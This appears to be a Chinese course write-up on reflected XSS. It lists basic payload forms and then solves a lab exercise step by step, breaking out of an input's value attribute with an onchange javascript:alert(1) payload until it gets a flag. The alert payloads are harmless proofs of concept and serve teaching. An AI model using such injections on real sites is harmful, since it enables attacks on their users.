---
date: "2020-12-18T00:00:00Z"
description: 反射性 XSS
keywords: XSS
tags:
- XSS
title: 反射性 XSS
---

# 反射性 XSS 利用方式

```
			Js的标识：弹窗：alert(1)
				标签风格：<script>alert(1)</script>
				伪协议触发：<a href=javascript:alert(1)>1</a>	(伪协议:) http:// ftp:// 小众协议：php:// 
				事件方法：<img src=1 onerror=alert(1) />
				(触发器：事件) 在标签里面on开头的东西很高概率是事件
```

## 课后习题

> http://59.63.200.79:8002/xss/index.php


**1. 确认输出**

在 input 框中随意输入字符， 使用  **查看源代码** ， 寻找可利用位置。

![](https://nc0.cdn.zkaq.cn/md/8461/fb909d7a3db8028c64d1fcdef3a0be2c_49556.png)

可以看到 ， 在 12行 ， 14 行出现了 输入的 123。 因此可以在这两点上测试利用。


**2. 使用 `标签风格闭合` 构建 js弹窗**

```html
' onchange="<script>alert(1)</script"> >
```

```html
<input name=keyword  value='123' onchange=&lt;script&gt;alert(1)&lt;/script&gt; &gt;'>
```

可以看到 value 的单引号已经被闭合， 并且创建了 `onchange` 事件。 但是由于 `<>` 被编码， 因此没有实现弹窗所需要的 js 代码。

![](https://nc0.cdn.zkaq.cn/md/8461/a8b5a48f403de8a98eebb6792b24f678_55770.png)


**3.  使用 `伪代码方式构建`  js 弹窗***

```html
123' onchange=javascript:alert(1) > //
```

```html
<input name=keyword  value='123' onchange=javascript:alert(1) &gt; // '>

```

从源代码可以看到， 已经通过 **onchange** 实现了 **js 伪代码** 的弹窗触发器。

条件是 ： input 框中的内容发生**变更**

![](https://nc0.cdn.zkaq.cn/md/8461/a09fa2130e969c16e198ab1b9f1273f3_36248.png)


**4. 触发**

随便修改输入框中的内容， 将鼠标移到框外任意地方点击。

alert 弹窗出现。 

![](https://nc0.cdn.zkaq.cn/md/8461/c94619f30a742363a05453ddeface9de_71733.png)

> flag: flag{zkaq-xssgood-Q0OA}
